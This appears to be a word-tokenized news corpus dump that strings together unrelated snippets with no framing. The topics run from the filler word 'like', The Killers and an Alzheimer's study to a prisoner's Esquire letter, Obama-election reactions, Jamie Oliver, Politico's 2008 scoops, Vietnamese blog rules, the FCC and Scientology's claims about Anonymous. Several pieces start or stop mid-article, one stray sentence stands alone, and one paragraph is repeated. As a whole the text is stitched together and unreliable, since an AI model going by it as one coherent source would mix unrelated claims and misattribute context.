A simile is a figure of speech in which “ like ” or “ as ” is used to compare dissimilar things .
Your teenage cousin ’s sentence , “ He ’s , like , an ox , ” is a metaphor .
Here , the word “ like ” is n’t used as a preposition for purposes of comparison , so we do n’t have a simile .
Critics see this form of “ like ” as merely a verbal tic , but linguists argue that it serves a purpose .
As I once wrote in an article for The New York Times Magazine , this “ like ” is used “ to emphasize something ( ‘ I was , like , exhausted ! ’ ) or to hedge a statement ( ‘ We had , like , six hours of homework ! ’ ) . ”
Both The American Heritage Dictionary of the English Language ( 4th ed. ) and Merriam - Webster ’s Collegiate Dictionary ( 11th ed. ) categorize “ like ” as an adverb when used in this way .
AH calls the usage “ nonstandard , ” but M - W notes that it ’s “ used interjectionally in informal speech . ”

Follow the rest of our DSi coverage here .
A lot of bands have released pretty good debut records , only to follow them up with less - than - spectacular careers .
The rule used to be ( before the FCC , the recording industry and the radio industry conspired to destroy all music ) that you learned what you needed to know about a band with its third album .
Given how things worked , you often saw a pattern that looked something like this :
Debut : Band ( or solo artist ) has been on the road for awhile , writing and building an audience and developing as a creative and performing force .
The first record contained the best songs they ’d managed to write over a period of a couple ( or three or four or five ) years .
Album is a big success .
The first record contained the best songs they ’d managed to write over a period of a couple ( or three or four or five ) years .
Album is a big success .
Follow - up :
The success of the first record has kept the band hopping for a few months and there ’s intense demand to get something new on the shelves .
As a result , album # 2 may wind up featuring the second - best set of songs , since the band has n’t had a chance to develop top - notch new material .
So the follow - up was sometimes a bit of a let - down .
Third Album :
By now the label has had a chance to invest in artist development ( a lost concept , I know ) for two or three years and a more mature set of material has been written .
So you get the band ’s best shot – if it fizzles , well , they had one great record .
If they ’re really all they were cracked up to be , though , you might get something like this :
War , U2
Sheer Heart Attack , Queen
Making Movies , Dire Straits
Zenyatta Mondatta , The Police
Damn the Torpedoes , Tom Petty & the Heartbreakers
Beatles ’ 65 , The Beatles
Reckoning or Fables of the Reconstruction ( depending on whether you count the EP ) , REM
You can probably think of a few of your own , and to be sure the dynamic I ’m describing is n’t universal ( for The Who , it was the fourth record , The Who Sell Out , for instance , and other bands simply ripped the lid off from the git - go – think Graham Parker and Van Morrison here ) .
We have n’t seen a lot of the old pattern in recent years because the labels have been more interested in mongering disposable titty - floggers than they have developing actual artists .
Today , though … today something special may be happening :
The Killers release their third studio effort ( no , the B - sides disc does n’t count ) , Day and Age .
The band ’s debut , Hot Fuss , was nothing short of fantastic , and they immediately set themselves at the head of the whole nu wave movement alongside Interpol and Franz Ferdinand .
Then they veered away from tradition a bit , as Sam ’s Town was actually better than the first release .
This owes in part to the speed with which Brandon Flowers and Co. realized they did n’t want to be trapped in a retro- nostalgia time warp : instead of taking another neo - ’80s dip , they reached even further back , into the ’70s , where they paid a worthy homage to Bruce Springsteen ’s Born to Run ( another of those iconic third albums , by the way , and arguably one of the two or three greatest ever ) .
( NOTE : I know some Killers fans hate the Springsteen comparisons , by the way , but do n’t blame me .
Check out what happens at the 1:48 mark of “ When We Were Young , ” then compare it to what happens 2:53 into “ Born to Run . ”
Besides , it ’s not like this is n’t about as huge a compliment as a band can be paid . )
This , I think , is what sets The Killers apart from so many other bands of their generation : ambition .
Great big aggressive epic ambition .
So many – soooooo many – of today ’s indie bands are possessed by a near - pathological rage for smallness .
They aspire , if one can use that word , to make the quietest , least noticeable , most trivial , insignificant semi-music possible .
Meanwhile , Flowers and bandmates David Keuning , Mark Stoermer and Ronnie Vannucci have seemingly grokked the majesty of true artistic aspiration – recalling that marvelous thing Bono said a few years back : “ It ’s still an extraordinary thing to behold , the sound of a rock band in full flight . ”
I ’ve heard a track or two off the new disc and saw their performance on SNL a few weeks back , and I ’m expecting great things from Day and Age .
Maybe I ’m setting myself up for a disappointment , but I doubt it .
The Killers want greatness , and their work to date suggests that they have an idea about what goes into attaining it .
They have been , to this point , the finest band of their generation .
Will they transcend their generation and take their place alongside all those other bands who began revealing the full measure of their greatness with the release of their third albums ?
We ’ll know more today .

Alzheimer 's ' caused by less blood sugar flowing to the brain '
Improving the blood flow to the brain could prevent sticky clumps of protein forming that scientists believe cause Alzheimer's
A slow , chronic reduction of blood sugar to the brain could trigger some forms of Alzheimer 's disease , U.S. researchers said .
The study of human and mice brains suggests a reduction of blood flow deprives energy to the brain , setting off a process that ultimately produces the sticky clumps of protein researchers believe is a cause of the disease , they said .
The finding could lead to strategies such as exercise , reducing cholesterol and managing blood pressure to keep Alzheimer 's at bay , study leader Robert Vassar from Northwestern University reported .
' This finding is significant because it suggests that improving blood flow to the brain might be an effective therapeutic approach to prevent or treat Alzheimer 's , ' he said .
' If people start early enough , maybe they can dodge the bullet . '
Alzheimer 's disease is incurable and is the most common form of dementia among older people .
It affects the regions of the brain involving thought , memory and language .
While the most advanced drugs have focused on removing clumps of beta amyloid protein that forms plaques in the brain , researchers also are looking at therapies to address the toxic tangles caused by an abnormal build - up of the protein tau .
Vassar and colleagues analyzed human and mice brains to discover that a protein called elF2 alpha is altered when the brain does not get enough energy , which is produced by the constant flow of blood sugar to the brain in a normal , healthy body .
This reduction in energy boosts production of an enzyme that in turn flips a switch to produce the sticky protein clumps .
The finding published in the journal Neuron could lead to drugs designed to block the elF2 alpha production that begins the formation of the protein clumps , also known as amyloid plaques , Vassar added .
' What we are talking about is a slow , insidious process over many years , ' he said .
' It 's so mild ( people ) do n't even notice it , but it has an effect over time because it 's producing a chronic reduction in the blood flow . '
Saint James Harris
Wood is doing time in a California penal colony for some heroin related stuff .
He writes Esquire letters A lot of letters
We love them all .
In the letter below , St. James explains how and whyhe was fired ( the injustice ! ) from his beloved job as prison librarian .
Also , you 'll notice that he mentions us , Esquire , at the end ofa letter that is presumably to us .
We figure this means he sends thesame letter to all of his correspondents .
We do n't really mind .
Dear Camille ,
I hope your life lately is steady , true and most important ... normal .
Mine is not .
Chaos has stirred the pot of Saint James , grabbed me by the hair and cracked my head against the sidewalk .
I lost my stupid job in the library .
99.9 % of the time , if a convict loses his job while in prison , there 's Punishment , write - ups and new dirt in the convict 's permanent record .
But none of that happened to me .
I was relieved of my duties as Library Overlord because my rookie free staff boss mailed one of my stories out to the local Art's Council .
Nothing written by an inmate is supposed to leave the institution without scrutiny .
Every letter , story , political manifesto or poem is checked .
I did n't ask the librarian to mail my story out , which is why I 'm not in the hole writing you letters on toilet paper ; but , one day , idly at work in the library ( I loved it ! ) , a week after the " incident " , ignorant of my transgression , I am arrested ( in prison ! ) by two special squad cops and taken to a secret room where a high ranking special squad officer ( who looks like a cruel mustachioed movie star ) literally ripped my library work card into shreds , then tried to interrogate me as if I were an assassin or Republican .
I first stood accused of circumventing institutional security and manipulating staff .
Lieutenant Cruel started off by telling me I was going to the hole .
It sounded restful to me , regardless of how others feel .
But after a spirited discussion with the special squad , being told that the investigation was going to continue for an indefinite period during which time I was banned from the library even to check out books . . . nothing happened except that I am branded as an , irascible mapcap who is not allowed to be a clerk for a year .
No one will ever love those books like I did .
Documents are provided .
And then . . . with shocking quickness I was assigned to the lowest of the low jobs in the kitchen / dining roan which is only manned by the people who do n't have the juice , wit or resources to get the hell out .
Table wipers make nothing per hour and are n't even fed well .
I developed a host of physical problems the very day I was assigned to the new job .
These ailments actually exist and have a history supported by X - Rays ( traumatic arthritis ; sciatica ; and a career ending knee injury tock basketball out of my life ) and my lazy doctor who I 've never seen in two years .
These afflictions helped the prison to let me go unemployed for a minute , which is what I really and truly want ~ so that I can write all day and all night until I have a mental breakdown and then I 'll write about that .
Now I 'll have time to finish the dozen or so short stories I 'm working on , and letters obviously .
What have you been reading ?
Details please .
I just read " Stolen Lives " by Malika Oufkir ( whole family in Morrocan penal colony ) , and " Wild Palms " by William Faulkner — I think you 'd like it — a beautiful , weird kidney jab of a book .
I shamble through hundreds of books a year .
It 's great .
My totally unfocused research tells me that in the 1920s & 30s the most popular fiction writer in Germany ( ca n't recall the name ) wrote a couple dozen novels about the American West featuring the most savage , fearless fighters and killers who ever lived ( according to these novels ) : Indians !
One of the reasons the Nazis put off attacking America is because from the foot soldiers in the ranks to the Generals and Admirals , no man of fighting age in Nazi Germany wanted to fight Indians .
I used to be afraid of Tongans until this kid from Tonga played keyboards in my last prison band .
15 ( Nov. ) Still selling more poems than stories , rather it was the other way around .
However , an interesting development : Esquire wants to publish some of my letters .
A lot of them are basically pieces of my diary ( " Diary of a Mad Poet in Prison " ) which I 've also sent to you .
Do me a favor and see if you can find me on their site .
I have no access to the world in the web and it drives me crazy .
It 's Esquire 's web site , not the mag .

“ It ’s kind of nice to feel good about the United States again , ” said Armando Díaz , 24 , a bookkeeper in Caracas , Venezuela , where Enrique Cisneros , a storekeeper summed it up like this : “ A few hours ago , the world felt like a different place . ”
In Iran , too , some said the American example should persuade politicians closer to home to adopt similar political ways .
‘’ His election can be a lesson for the dictators of the Middle East , ” said Badr - al - sadat Mofidi , the deputy editor of the daily Kargozaran newspaper .
Some in Iran focused on their hopes for a change in American attitudes towards their country .
‘’ The nightmare of war with the United States will fade with Obama ’s election , ” said Nehmat Ahmadi , a lawyer .
Indeed , for many who had watched this campaign from afar , there was a sense that the election was not just an American affair but something that touched people around the world , whatever their origin .
“ I want Obama to win with 99 percent , like Saddam Hussein , ” said Hanin Abu Ayash , who works at a television station in Dubai and monitored early returns on his computer .
“ I swear if he does n’t win , I ’m going to take it personally . ”
In Berlin , Anna Lemme , a 29 - year - old architect , said she did not usually hurry to catch the news first thing in the morning .
‘’ But this morning I jumped to the radio first thing at 5 a .m. , ” she said .
There was little doubt that for some , Mr. Obama ’s skin color made his victory all the more exhilarating .
“ The United States is choosing a black man as its president .
Maybe we can share a bit in this happiness , ” Mr. Cisneros said in Caracas .
The Afghan president , Mr. Karzai , said the election had shown the American people overcoming distinctions “ of race and color while electing their president ” and thereby helping to bring “ the same values to the rest of the world sooner or later . ”
Barrowman plays Jack Harkness in Doctor
Who spin- off Torchwood
Torchwood star John Barrowman has apologised for exposing his genitals during a live BBC Radio 1 broadcast .
" I was joining in the light - hearted and fun banter of the show and went too far , " he said .
" I was wrong to do this and it will never happen again . "
The BBC has also apologised for the incident on Sunday 's Switch show , which prompted one listener to complain .
" We do feel the programme overstepped the mark , " it said , adding an apology was made at the end of the broadcast .
A spokeswoman also stressed that nothing untoward was screened online via the station 's webcam .
Barrowman was chatting with hosts Nick Grimshaw and Annie Mac when he was asked about his predilection for exposing himself during interviews .
He responded by saying he was going to " get it out " , amid laughter .
Barrowman said later : " I did n't take the whole thing out , but I got my fruit and nuts out . "
In a statement issued on Monday , the I 'd Do Anything judge said he appreciated " the great support " he had received from the BBC over the last few years .
He " would never intentionally do anything to undermine the integrity of the corporation , " he continued .
" I apologise for any offence I have caused . "
The show has now been taken off the BBC's iPlayer service .
Britain 's obesity epidemic transcends class because for the first time in history a large number of people of all incomes cannot cook , Jamie Oliver told MPs at Westminster yesterday .
Appearing in front of the select committee on health inequalities , the 33 - year - old chef said the nation 's health crisis was nothing to do with class or money , but " knowledge " .
He called on the government to invest £ 6.5 bn in food education over the next decade - 10 times the amount it has stumped up so far to improve school dinners .
He pointed out what he said were flaws in the government 's plans to teach primary school children to cook , and said it was " a bloody disgrace " that no more than 5,000 of the nation 's 125,000 dinner ladies had so far been trained in healthy eating .
He warned the panel of an " incredibly profound " health crisis caused by poor nutrition , and called for controls on the fast food industry to counter the commercial influences pushing people to eat unhealthily .
Local authorities should be more strict when granting planning permission to takeaway outlets , he said .
Oliver also offered his services to help the government appoint a food tsar .
" Why is n't there a minister of food ? " he asked the panel .
" Why is n't there someone from the private sector all over this like a rash ?
Why have n't we got one person driving this for the next 10 years ? "
After the session , Oliver told journalists that he would not accept the job himself , as he felt he could be more effective " being on the periphery " than " inside " .
But he offered to headhunt someone for the job .
During the hearing , Oliver rejected the notion that poor eating was a class issue .
" There are plenty of City boys who earn - well , used to earn - a lot of money who can't nourish their kids , even on a gold card , " he said .
" I can tell you it is categorically not about money or time .
It 's about knowledge . "
The economic downturn loomed large over the session .
Oliver said whereas in the past when money was short people knew how to make nutritious , fresh meals cheaply , there was now a " generation of young parents " who were nervous about raw ingredients and could not cook .
" In this fifth - richest country in the world ... there is a new poverty that I have never seen before .
This is n't about fresh trainers or mobile phones or Sky dishes or plasma TV screens - they 've got all that .
It is a poverty of being able to nourish their family , in any class .
" This is the first time in British history that we have a large number of people who cannot cook . "
The answer , he said , was getting people cooking from a young age .
He welcomed the government 's plans to teach cooking in primary schools .
But he said many have n't been trained .
And as Ofsted had no plans to assess the cookery classes , how would the government keep tabs on whether they were working ?
And who was going to pay for the new facilities ?
Plus , he added , those few home economics teachers still working were a " very sad , depressed , demoralised workforce " and needed to be shown " a lot more love " .
He also said that the School Food Trust , the body set up in 2005 with £ 15 m of government funding to improve the quality of food in schools , needed more support .
He praised the trust , but said that as " they are still a government quango they can't always tell the truth ... they can't be as outspoken as I can ; they can't be a pain in the arse like I can be " .
He also criticised local authorities for being too slow to retrain dinner ladies .
That only 4,000 or 5,000 of the country 's 125,000 dinner ladies had been trained since 2005 could be a " deal breaker " for the healthy eating curriculum , he said .
Though Oliver welcomed the £ 650 m the government pledged in 2005 to improve food in schools , he said it was n't enough .
Using an analogy of opening a restaurant , he said current funds were " only enough to do the windows " , and that 10 times more money is needed over the coming decade .
Socially - influenced common knowledge — often disguised as evolutionary theory — holds that men are biologically inclined to have sex with as many women as possible to spread their seed , while women are biologically inclined to sink their claws into one man , push out kids for him to support and never , ever cheat .
This theory on How The World Works ignores the rather convenient fact that , biologically , women have the same incentives to diversify the genetic contributions to their offspring as men do and — it must be said — like sex just as much if not more .
So why is it that promiscuous women are supposedly such an anomaly ?
And are they ?
Mairi Macleod tries to answer those and man other questions in an epic article on sexuality in the latest New Scientist .
After the jump , a rundown of her article 's conclusions .

If you think someone is promiscuous , you might well be right .
In a recent study conducted in the UK and published in Evolution and Human Behavior , Lynda Boothroyd showed that both men and women were able to judge the openness of men and women to a sexual fling based on photographs of their faces .
The study showed that both genders judged men who looked " masculine " and women that looked " attractive " as , correctly , more open to casual sex .

Who a woman wants to sleep with — and her openness to doing so — varies with her cycle and her age .
A variety of studies have shown that women get hornier right before they ovulate , and a study by David Schmitt of Bradley University shows that women 's preferences in men vary around the same time .
In addition , another study conducted in 48 countries shows that women 's openness and propensity to engage in intercourse with multiple sexual partners ( including infidelity ) peaks in her 30s , while , for men , it peaks in their 20s .
Schmitt hypothesizes that this is because women 's fertility begins to decline at that point in her life .

Jay Belsky , in study published in Child Development , found that women who grew up in stressful family situations tended to have more kids early without waiting for stable relationships because , he hypothesized , they were sure one was coming .
He wrote , " harsh parenting in the first four years of life predicts early puberty and growth and thereby predicts more unrestricted sexual behaviour by the time the child reaches 15 years of age . "

It 's still about trust and security .
A variety of studies of both men's and women 's propensity to sleep around is based in their ability to trust or feel secure in relationships .
Schmitt says , " If a person was high in being able to trust other people , they were monogamous .
If they were very low in trust they were much more likely to be unrestricted in sociosexuality . "
He relates this , like Belsky , to childhood stresses and poor relationship models .

Sleeping around might be related to testosterone in both sexes .
A study Sarah Mikach and Michael Bailey of Northwestern University looked at the correlation between a woman 's sexual partners and how they look , felt or acted more stereotypically masculine and found , somewhat unsurprisingly , that woman who were identified as more " masculine " tended to have more sexual partners .
Of course , it all depends on the definition of " masculine behaviors , " but even when just taking biology into account , the theory seems to hold .
Researchers believe that having a longer ring finger than index finger is related to prenatal testosterone exposures — and a study by Andrew Clark in Evolution and Human Behavior found that women with longer ring fingers tended to have more sexual partners as well .

Oh , and , yes , there is a social aspect to all of this .
Biology is all well and good , but thousands of years of judging male and female sexuality differently does have more than a little something to do with women 's ability to act on their legitimate sexual desires .
Schmitt points out that , with the expansion of birth control , education , and access to social services for women , their ability and willingness to act on sexual urges definitely increases .
Fhionna Moore at the University of St Andrews found in her work that financially independent women did n't tend to seek out so - called " good providers , " as much as they did supposedly good jeans genes .
Basically , once a society begins to near equality for men and women , providing women with more autonomy and less of an incentive or requirement to buy into patriarchal sexual mores , they do n't — and then many of them go have a bunch of sex .

While humans are biologically driven to mate like any other species , the many , varied aspects of how , why and when we mate and ( sometimes ) bear children never seemed fully explained by " Women are biologically determined to be taken care of by a man . "
So , it 's nice to see a group of scientists try to tease out which aspects of human sexuality and coupledom are actually biological and which are socially - driven after so many decades of viewing thousands of years and biological and social evolution through a ( social ) nuclear family lens .
The Dizzying Diversity Of Human Sexual Strategies [ New Scientist ]
MADISON --
Plastics are everywhere in our modern world , largely due to properties that render the materials tough and durable , but lightweight and easily workable .
One of their most useful qualities , however - the ability to bend rather than break when put under stress - is also one of the most puzzling .
This property , described as " plastic flow " , allows many plastics to change shape to absorb energy rather than breaking apart , says University of Wisconsin - Madison chemistry professor Mark Ediger .
For example , one type of bulletproof glass stops a bullet by flowing around it without breaking .
Regular window glass , unable to flow in this way , would simply shatter .
" This is an odd combination of properties ...
These materials should n't be able to flow because they 're rigid solids , but some of them can , " he says .
" How does that happen ? "
Ediger 's research team , led by graduate student Hau - Nan Lee , has now described a fundamental mechanism underlying this stiff - but - malleable quality .
In a study appearing Nov. 28 in Science Express , they report that subjecting a common plastic to physical stress - which causes the plastic to flow - also dramatically increases the motion of the material 's constituent molecules , with molecular rearrangements occurring up to 1,000 times faster than without the stress .
These fast rearrangements are likely critical for allowing the material to adapt to different conditions without immediately cracking .
Plastics are a type of material known to chemists and engineers as polymer glasses .
Unlike a crystal , in which molecules are locked together in a perfectly ordered array , a glass is molecularly jumbled , with its constituent chemical building blocks trapped in whatever helter - skelter arrangement they fell into as the material cooled and solidified .
While this atomic disorder means that glasses are less stable than crystals , it also provides molecules in the glass with some wiggle room to move around without breaking apart .
" Polymer glasses are used in many , many different applications , " including polycarbonate , which is found in popular reusable water bottles , Ediger says .
Aircraft windows are also often made of polycarbonate .
" One of the reasons polymer glasses are used is that they do n't break when you drop them or fly into a bird at 600 miles per hour . "
However , their properties can change dramatically under different physical conditions such as pressure , temperature , and humidity .
For example , many polymer glasses become brittle at low temperatures , as anyone knows who has ever dropped a plastic container from the freezer or tried to work on vinyl house siding in cold weather .
As plastics become more and more prevalent in everything from electronics to airplanes , scientists and engineers face questions about the fundamental properties and long - term stability of these materials over a range of conditions .
For example , next - generation commercial aircraft are trending toward including less metal in favor of higher proportions of lightweight polymer materials - roughly 50 percent in the new Boeing 787 compared to only 10 percent in the Boeing 777 - and engineers need to know how these materials will respond to different stresses : a hard landing , strong winds , or changes in temperature or humidity .
" How is it going to respond 20 years from now when it gets twisted , or stretched , or compressed ?
Is it going to respond by absorbing that energy and staying intact , or is it going to respond by breaking bonds and flying apart into pieces ? " asks Ediger .
The Wisconsin team examined the mechanics of a common plastic called polymethylmethacrylate - also known as Plexiglas or acrylic - and found that a pulling force had a pronounced effect on the molecules within the material , speeding up their individual movements by more than a factor of 1,000 .
The team observed internal molecular rearrangements within 50 seconds that would have taken a full day without the force applied .
They believe this increased motion allows the material to flow without breaking .
" When you pull on it , you increase the mobility in the material , " Ediger says .
" The act of pulling on it actually transforms the glass into a liquid that can then flow .
Then when you stop pulling on it , it transforms back to a glass . "
The work has benefited from collaboration between chemists and engineers in a Nanoscale Interdisciplinary Research Team ( NIRT ) supported by the National Science Foundation ( NSF ) , which includes UW - Madison chemical and biological engineering professor Juan de Pablo and groups at the University of Illinois and Purdue University .
" From the most fundamental perspective , we 're trying to understand why pulling on a glass allows it to flow , " Ediger says .
" The answer to that question will help us to better model the behavior of real materials in real applications . "

In an interview with CBS ' Evening News ' anchor Katie Couric , Gov. Sarah Palin was unable to answer such simple questions as what newspapers and magazines she regularly read .
Top 10 political scoops of 2008
As the curtain comes down on 2008 , it ’s hard to let go .
Political junkies could n’t have asked for a better year — even news veteran David Broder dubbed the 2008 election the best he ever covered .
Game - changing moments came from mainstream and new media outlets , traditional newsmaker interviews , and off - the - cuff remarks captured by amateurs .
Advertisement
So herewith , Politico ’s take on the top ten political scoops of 2008 .
There ’s no accounting for tastes , so we welcome your picks , too .
What stories turned your engine ?
1. Couric and Palin ( CBS News ) : Charlie Gibson scored the first Sarah Palin interview , now remembered mostly for the ABC anchor ’s professorial manner and his question about the 6 - year - old “ Bush Doctrine ” of military preemption , on which Palin effectively drew a blank .
But rival anchor Katie Couric proved even tougher for the vice presidential candidate , who was unable to answer such simple questions as what newspapers and magazines she regularly read .
Palin ’s stumbling responses were spoofed verbatim by her comedic doppelganger , Tina Fey .
2. McCain ’s houses ( Politico ) : John McCain answered several questions from Politico ’s Mike Allen and Jonathan Martin in an August interview , but it was the one he could n’t answer that grabbed the headlines — how many houses he owned .
Not surprisingly , Democrats pounced on the notion that the Republican nominee was out of touch , and Obama supporters donned buttons at the Denver Democratic convention reading : “ Ask me how many houses I own . ”
3. Obama on “ bitter ” small - town Americans ( Huffington Post ) : Obama committed few major gaffes during his nearly two - year run for president , and his worst verbal misstep was n’t caught by a big - time media outlet , but by citizen journalist Mayhill Fowler .
At a San Francisco fundraiser , Obama talked about small - town voters who “ get bitter ” and “ cling to guns or religion . ”
Aside from the political fallout , the Huffington Post report showed how citizen journalists — using their own cell phones , cameras and laptops — can scoop the boys on the bus .
4 ) Palin ’s shopping spree ( Politico ) : Palin ’s folksy public persona was put to the test when Politico ’s Jeanne Cummings reported that the Republican National Committee had shelled out $ 150,000 to upgrade her and her family ’s wardrobe .
The campaign tried to brush off the Saks Fifth Avenue and Neiman Marcus tabs by claiming the clothes would be given to charity after the campaign .
But by that time , late - night talk show hosts and " Saturday Night Live " writers were already busy at work .
5 ) Clinton camp turmoil ( Washington Post and The Atlantic ) : Just two days after Hillary Rodham Clinton chalked up wins in Ohio and Texas , the Washington Post 's Peter Baker and Anne Kornblut revealed bitter squabbling among her top advisers , including Harold Ickes and Mark Penn .
The behind - the - scenes tension was captured by the reporters in one memorable exchange : " ' [ Expletive ] you ! '
Ickes shouted .
' [ Expletive ] you !'
Penn replied . ' [ Expletive ] you !'
Ickes shouted again . "
Months later , The Atlantic ’s Joshua Green returned to the theme armed with a treasure trove of top staffer memos .
6 ) Jeremiah Wright tapes ( ABC News ) : ABC ’s Brian Ross first aired snippets of the fiery sermons by Obama ’s pastor , the Rev. Jeremiah Wright , that became YouTube staples , including his “ God Damn America ! ” outbursts and his post - 9/11 comments about how “ America ’s chickens are coming home to roost . ”
Dogged by Wright ’s remarks , Obama — who until then had avoided openly discussing race — was forced to give a major speech on the subject .
Although McCain refused to exploit Wright ’s comments in advertisements , the sermons continued as hot topics through Election Day on right - wing radio and blogs .
7 ) Network TV ’s military analysts ( New York Times ) : The Times ’ David Barstow exhaustively reported on lucrative ties between TV ’s military analysts , the Pentagon and lobbying firms .
While broadcast and cable news networks largely ignored the front - page scoop , bloggers kept on the story .
Last month , in a story headlined “ One Man ’s Military - Industrial - Media Complex , ” Barstow followed up with a lengthy look at NBC analyst and retired Army Gen.
Barry McCaffrey , who ’s profited from deals with private military contractors .
8 ) McCain ’s inner circle ( New York Times Magazine ) : Although it was published before Election Day , Robert Draper ’s deeply reported profile of McCain ’s inner circle read more like a post - mortem .
In “ The Making ( and Remaking ) of John McCain , ” Draper used his extraordinary access to provide both a tick - tock of events and overall portrait of a campaign struggling relentlessly , and often fruitlessly , to craft an effective message against Obama .
9 ) Edwards ’ extramarital affair ( National Enquirer ) : Even after mainstream outlets ignored the National Enquirer ’s initial reports on John Edwards ’ affair , the tabloid kept digging .
Their efforts culminated in July with a successful stakeout of the Beverly Hilton Hotel in Los Angeles — where Edwards met with the woman — and Edwards ’ subsequent admission of an affair in an interview with ABC ’s Bob Woodruff .
Of course , the news would have been bigger if Edwards had still been in the race , but the story likely kept the former senator off short lists for top jobs in Obama ’s administration .
10 ) Powell ’s endorsement ( NBC ) : Despite the absence of Tim Russert , who passed away in June , “ Meet the Press ” and other Sunday shows continued to be the favored weekly pit stop for candidates , supporters , and public figures needing to get an announcement off their chests .
With the campaign winding down , former Secretary of State Colin Powell , whose support would benefit either candidate , told Tom Brokaw on Oct. 19 that was he was bucking the Republican Party and backing Obama .
The first phase of the “ Clash Royale ” Crown Championship Global Series has begun yesterday .
With this occasion , Supercell is inviting all players to join the tournament ( it ’s Open Play ) and try out their chances to win it .
We have to mention that the first phase of the tournament will end on May 16 , 2017 , while the second phase will begin on May 20 , 2017 and it will end on May 27 , 2017 .
The third phase of Crown Championship Global Series will begin on June 10 , 2017 and it will end on June 25 , 2017 and finally , the phase 4 ( finals ) will start on June 30 , 2017 and it will end on July 2 , 2017 .
To make things even better , there are rumors which claim that the game developing company is preparing to release some new cards for Clash Royale .
We remind you that Clash of Clans is about to receive a shipyard feature and this is one of the reasons why rumors say that ships and boats are about to come on Clash Royale also .
At the same time , the fans of Clash Royale think that the developers will also bring some aerial defense cards sometime soon in order to balance the last aerial cards that they ’ve added in the latest major patch .
Unfortunately , Supercell has not confirmed that it is thinking about releasing such new cards , but we all know that the company prefers to stay mum about these sorts of things until they get released .
They sometime upload some teaser videos for the major updates that are released for Clash of Clans , but when it comes to Clash Royale , the company prefers to upload videos regarding the new cards only after they are added to the game .
What other cards would you like to see being added to Clash Royale ?

Many Vietnamese use blogs as a way to find out the latest news
Vietnam has tightened restrictions on internet blogs , banning bloggers from raising subjects the government deems inappropriate .
Blogs should follow Vietnamese law , and be written in " clean and wholesome " language , according to a government document seen by local media .
Internet service providers will be held accountable for the content of blogs they host .
More than 20 million Vietnamese use the internet - a quarter of the population .
Source of news
Vietnam 's burgeoning blogging community has become an important source of news for many people in the country , where the national media is still tightly controlled by the state .
The new rules , drawn up by the Ministry of Information and Communications , require internet service providers to report to the government every six months and provide information about bloggers on request .
The rules ban posts that undermine national security , incite violence or disclose state secrets .
It is unclear whether the new regulations will apply to international companies such as Google or Yahoo ; currently the most popular blogging host in Vietnam is Yahoo !360 .

It does not discriminate on the basis of race , color , national and ethnic origin in administration of its educational policies , admissions policies , scholarship and loan programs , and athletic and other school - administered programs .

“ When the commission puts expediency ahead of an open process , it creates unnecessary resentment from parties that believe they were not given a fair hearing , ” said Jonathan S. Adelstein , a commissioner .
He said he nevertheless voted for the measure because he felt further delay was unlikely to change the outcome .
In addition to the broadcasters , the decision was opposed by the Broadway theater industry , which argued that new devices using the white spaces could interfere with transmissions from wireless microphones and among crew members .
A coalition of Broadway producers and performers joined the broadcasters in arguing that the F.C.C. should conduct more tests .
“ We are deeply disappointed with the F.C.C. decision that could silence Broadway productions and those at other venues around the country , ” said Charlotte St. Martin , executive director of the Broadway League , a trade group representing the New York theater industry .
The discussion over how to handle white spaces emerged in light of an impending change in the way television signals were delivered .
Starting in February , TV stations will be required to switch to digital from analog delivery .
Since 2004 , the F.C.C. has been studying whether the frequencies between television channels  the white spaces  could be used by other devices , particularly because digital signals are less prone to interference .
The F.C.C. performed two sets of tests that showed some potential for disruption on frequencies used by broadcasters , live theater performances or others who rely on the same spectrum .
But F.C.C. commissioners said they had confidence that interference could be mitigated through tight regulation of new devices .
For devices to be automatically certified by the commission , they must include technology that determines whether they are in a location where the channels are protected for use by incumbent broadcasters ; if they are , they must find some other channel to transmit on .

Wikinews has learned that the Church of Scientology has begun to falsely accuse the internet protest group Anonymous of a 2007 school shooting in Finland .
The Church , on October 18 , 2008 accused Anonymous of being involved in the November 2007 shooting at Jokela High School , in which a man named Pekka - Eric Auvinen shot and killed nine people , including himself .
" Anonymous member Pekka - Eric Auvinen shot and killed seven students , a nurse and a teacher at Jokela High School in Finland before turning the gun on himself and taking his own life , " said the Church in the October 18 press release .
On October 17 , the President of the Church of Scientology in New York City , John Carmichael , also accused Anonymous of being behind the shooting .
According to the leader of the criminal investigation of the Jokela High School Shooting in 2007 , there was no link between the group called ' Anonymous ' and the offender [ Auvinen ] .
— Tapio Ahola , Detective Chief Inspector of the NBI
One month ago , an article on CNN 's citizen journalism wing , iReport , also accused Anonymous of being behind the shooting , and several other alleged terrorist plots .
The article also went on to accuse Anonymous of being behind the suicide of 14 - year - old Megan Meier who killed herself after being ' cyber - bullied ' .
Scientology says the initial attack was done by a member of Anonymous named Josh Evans , who later turned out to be a false alias created by Lori Drew , the mother of one of Meier 's friends .
Meier 's mother had previously had a falling out with Drew .
Wikinews contacted the National Bureau of Investigation ( NBI ) in Finland by e-mail , seeking evidence or a statement to confirm or deny any connection to Anonymous and verify or debunk the claim made by the Church .
Wikinews was able to confirm that there was no connection between Anonymous and the 2007 shooting .
" According to the leader of the criminal investigation of the Jokela High School Shooting in 2007 , there was no link between the group called ' Anonymous ' and the offender [ Auvinen ] , " said Tapio Ahola , Detective Chief Inspector of the NBI to Wikinews .
The Church also accuses Anonymous of plotting terrorist attacks against other schools , stadiums and even plotting a mall massacre which would allegedly have taken place in Los Angeles , California .
HAVE YOUR SAY
What do you think about these claims made by the Church of Scientology ?
Add or view comments
The Church says that Jarrad Willis , who was arrested and questioned after posting the hoax massacre threat on 4 chan.org , committed suicide while awaiting charges of internet crimes .
Wikinews found that his suicide happened just one day before he was to be charged for a crime unrelated to the threat and that authorities had dropped all other charges against him , in relation to the hoax .
The accusations appear to be part of a Scientology tactic developed by the organization 's founder , L. Ron Hubbard called " fair - game " .
The Church uses this tactic to harass people , often fabricating lies and defamation against those who protest or criticize their beliefs .
Wikinews contacted the Church several times by e-mail for a statement , but the Church has yet to reply .

More than three years ago , I wrote a cover story about the costs of providing security for the 2010 Olympics in Vancouver .
It was called " 2010 : It 's the terror , stupid " .
In that article , a security expert named Ron Foyle said that the $ 177 million budgeted for Olympic security was too low -- perhaps by half .
Foyle oversaw security at Expo 86 and for the only papal visit to B.C. , so he knew what he was talking about .
Tonight on Shaw TV , Vaughn Palmer asked Finance Minister Colin Hansen what the Olympic security bill would be for taxpayers .
Hansen refused to say .
Palmer asked when the taxpayers would know what the bill would be .
Hansen refused to say .
At the 2002 Olympics in Salt Lake City , the security budget rose from US $ 84 million to US $ 330 million .
